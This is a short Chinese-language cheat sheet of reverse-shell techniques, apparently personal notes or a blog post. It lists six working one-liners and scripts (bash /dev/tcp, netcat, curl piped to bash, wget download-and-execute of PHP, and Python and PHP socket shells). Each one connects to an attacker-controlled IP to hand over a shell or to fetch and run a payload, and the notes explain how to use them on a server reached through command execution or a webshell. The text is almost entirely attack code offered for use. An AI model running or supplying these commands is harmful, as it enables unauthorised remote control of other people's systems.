# 1.bash反弹shell
个人感觉bash反弹是最简单、也是最常见的一种。

```bash
bash -i >& /dev/tcp/192.168.20.151/8080 0>&1
```

# 2.netcat 一句话反弹

```bash
~  nc 192.168.31.151 7777 -t  /bin/bash
 ```
 命令详解：通过webshell我们可以使用nc命令直接建立一个tcp 8080 的会话连接，然后将本地的bash通过这个会话连接反弹给目标主机（192.168.31.151）。
 
# 3.curl反弹shell
前提要利用bash一句话的情况下使用curl反弹shell

在存在命令执行的服务器上执行：

```bash
curl ip|bash
```

该ip的index文件上含有bash一句话，就可以反弹shell，例如在自己的服务器index上写上一句话

```bash
bash -i >& /dev/tcp/192.168.20.151/7777 0>&1
```

# 4.wget方式反弹
利用wget进行下载执行

```bash
wget 192.168.20.130/shell.txt -O /tmp/x.php && php /tmp/x.php
```

# 5.python反弹
py脚本

```python
#!/usr/bin/python
#-*- coding: utf-8 -*-
import socket,subprocess,os
s=socket.socket(socket.AF_INET,socket.SOCK_STREAM)
s.connect(("192.168.20.151",7777)) #更改localhost为自己的外网ip,端口任意
os.dup2(s.fileno(),0)
os.dup2(s.fileno(),1)
os.dup2(s.fileno(),2)
p=subprocess.call(["/bin/sh","-i"])
```

```bash
curl ip/shell.py|python
```

# 6.php反弹

php脚本
```php
<?php
$sock=fsockopen("192.168.20.151",7777);//localhost为自己的外网ip，端口任意
exec("/bin/sh -i <&3 >&3 2>&3");
?>
```

不过这里要将php保存成txt文件进行反弹，若为php文件不会反弹成功。
```bash
curl ip/shell.txt|php
```


